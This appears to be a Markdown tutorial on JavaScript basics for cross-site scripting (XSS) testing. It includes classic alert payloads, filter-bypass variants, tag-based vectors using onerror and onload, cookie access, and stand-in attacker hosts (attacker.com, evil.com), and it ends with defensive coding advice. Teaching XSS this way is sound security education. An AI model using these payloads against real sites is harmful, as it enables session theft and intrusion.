<p align="center">
  <img src="https://github.com/user-attachments/assets/dfd63f52-66b8-43c8-8890-d658cd26cd82" width="777" height="405" alt="image" />
</p>


## **1. What is JavaScript?**

**JavaScript** is a **high-level**, **interpreted**, and **dynamically typed** scripting language designed to create **interactive**, **dynamic**, and **responsive web pages**. It is one of the three core technologies of the web: **HTML**, **CSS**, and **JavaScript**.

### Key Characteristics:

* **Interpreted**: Runs directly without needing compilation.
* **Client-Side by default**: Runs in the user’s browser.
* **Multi-Paradigm**: Supports object-oriented, procedural, and functional programming.
* **Dynamic typing**: Variable types are determined at runtime.
* **Event-driven**: Enables reactions to user actions like clicks, hovers, inputs, etc.

### History:

* Created in **1995 by Brendan Eich** at Netscape.
* Initially called **Mocha**, then **LiveScript**, then **JavaScript**.
* Standardized under **ECMAScript (ES)**, with versions such as ES5, ES6 (2015), and beyond.

---

## **2. Why JavaScript Matters in XSS**

JavaScript is **central to all XSS attacks**. Every successful XSS attack leads to the execution of **malicious JavaScript** in a victim’s browser. Understanding JavaScript in-depth helps both attackers and defenders.

XSS relies on:

* Injecting JS code through vulnerable inputs.
* Manipulating the **DOM** using JavaScript.
* Accessing browser APIs like `document.cookie`, `alert`, `window.location`, etc.

---

## **3. Where Can JavaScript Run?**

### 1. **Client-Side (Browser):**

* Most common use-case.
* Executed by browsers (Chrome, Firefox, Safari, etc.)
* Used for UI interactions, animations, AJAX, etc.

### 2. **Server-Side (Node.js):**

* JS runtime environment based on Chrome’s V8 engine.
* Enables JS on the backend (APIs, databases, etc.)
* Common in full-stack development.

---

## **4. How Is JavaScript Loaded into Web Pages?**

### 1. **Inline Script (in HTML)**

```html
<script>
  alert("Hello from JavaScript");
</script>
```

### 2. **External JavaScript File**

```html
<script src="script.js"></script>
```

### 3. **Script Tag Attributes**

* `defer`: Defers execution until after HTML parsing.
* `async`: Loads script asynchronously.

```html
<script src="script.js" defer></script>
```

---

## **5. JavaScript Alert (Classic XSS Payload)**

### Basic Example:

```javascript
alert("XSS Found!");
```

### Alternative Forms (for bypassing filters):

```javascript
window.alert("XSS!");
self.alert("XSS!");
top.alert("XSS!");
this["al"+"ert"]("XSS");
Function("alert(1)")();
```

---

## **6. The DOM (Document Object Model)**

### Definition:

The DOM represents the structure of a webpage as a tree of objects. JavaScript uses the DOM to **access**, **modify**, and **react to** elements dynamically.

### Accessing DOM Elements:

| Method                     | Description                              |
| -------------------------- | ---------------------------------------- |
| `getElementById(id)`       | Selects an element by ID                 |
| `getElementsByClassName()` | Selects elements with a specific class   |
| `getElementsByTagName()`   | Selects elements by tag                  |
| `querySelector()`          | Selects the first matching element (CSS) |
| `querySelectorAll()`       | Selects all matching elements (CSS)      |

### Example:

```javascript
document.getElementById("title").innerText = "New Title";
document.querySelector(".item").style.color = "red";
```

---

## **7. DOM Manipulation Examples**

### Change text:

```javascript
document.getElementById("title").textContent = "Hello, User!";
```

### Insert HTML (vulnerable if not sanitized):

```javascript
document.getElementById("box").innerHTML = "<img src=x onerror=alert('XSS')>";
```

### Remove elements:

```javascript
document.getElementById("adBanner").remove();
```

### Create and append:

```javascript
const p = document.createElement("p");
p.textContent = "New paragraph";
document.body.appendChild(p);
```

---

## **8. Event Handlers (Critical in XSS)**

Event handlers run JavaScript code when user interactions happen (like clicks or mouseovers).

### Inline HTML Events:

```html
<img src="x" onerror="alert('XSS')">
<button onclick="alert('Clicked')">Click</button>
```

### JavaScript Event Listeners:

```javascript
document.getElementById("btn").addEventListener("click", function() {
  alert("Button clicked!");
});
```

Common Events: `onclick`, `onmouseover`, `onerror`, `onload`, `onfocus`, `onchange`, `onsubmit`

---

## **9. HTML Tags Commonly Used in XSS Payloads**

| Tag        | Purpose                          | Example                              |
| ---------- | -------------------------------- | ------------------------------------ |
| `<script>` | Execute JS code                  | `<script>alert(1)</script>`          |
| `<img>`    | `onerror` handler executes code  | `<img src=x onerror=alert(1)>`       |
| `<svg>`    | `onload` attribute               | `<svg onload=alert(1)>`              |
| `<iframe>` | Embed external JS or redirection | `<iframe src="javascript:alert(1)">` |
| `<body>`   | Event-driven XSS                 | `<body onload=alert(1)>`             |
| `<video>`  | `onerror` support                | `<video src=x onerror=alert(1)>`     |
| `<input>`  | Inline handlers with autofocus   | `<input onfocus=alert(1) autofocus>` |

---

## **10. Useful JavaScript Functions for XSS**

| Function          | Purpose                            | Example                            |
| ----------------- | ---------------------------------- | ---------------------------------- |
| `alert()`         | Show popup                         | `alert("XSS")`                     |
| `prompt()`        | Input box                          | `prompt("Enter your email")`       |
| `confirm()`       | Confirmation dialog                | `confirm("Are you sure?")`         |
| `console.log()`   | Debugging                          | `console.log("Test")`              |
| `eval()`          | Execute string as code (dangerous) | `eval("alert(1)")`                 |
| `setTimeout()`    | Delay code execution               | `setTimeout(() => alert(1), 1000)` |
| `fetch()`         | Make HTTP request                  | `fetch("https://attacker.com")`    |
| `Function()`      | Create dynamic function            | `Function("alert(1)")()`           |
| `location.href`   | Redirect browser                   | `location.href="https://evil.com"` |
| `document.cookie` | Access cookies                     | `alert(document.cookie)`           |

---

## **11. JavaScript Best Practices (From Security Perspective)**

### Do:

* Use `textContent` or `innerText` instead of `innerHTML` when inserting user input.
* Sanitize and validate user input on both client and server.
* Implement **Content Security Policy (CSP)**.
* Escape output based on context (HTML, JS, URL, etc.).
* Use **trusted frameworks** that handle escaping (e.g., React, Angular, Vue).

### Avoid:

* Using `eval()`, `Function()`, or `document.write()`.
* Dynamically creating scripts with `innerHTML`.
* Inline event handlers in HTML (`onclick`, `onerror`, etc.).

---

## **12. Additional JavaScript Concepts (Useful for Advanced Payloads)**

| Concept                           | Description                                               |
| --------------------------------- | --------------------------------------------------------- |
| **Closures**                      | Functions that remember outer scope variables             |
| **Scopes**                        | Global, function, block-level using `let`, `var`, `const` |
| **Hoisting**                      | Variables and functions get moved to top                  |
| **Arrow Functions**               | Shorter syntax for function expressions                   |
| **Async/Await**                   | Cleaner way to handle asynchronous code                   |
| **Promises**                      | For managing async operations                             |
| **Template Literals**             | Backtick-based strings with interpolation                 |
| **Modules (ESM)**                 | Export/import JS code across files                        |
| **LocalStorage / SessionStorage** | Store key-value data in browser                           |


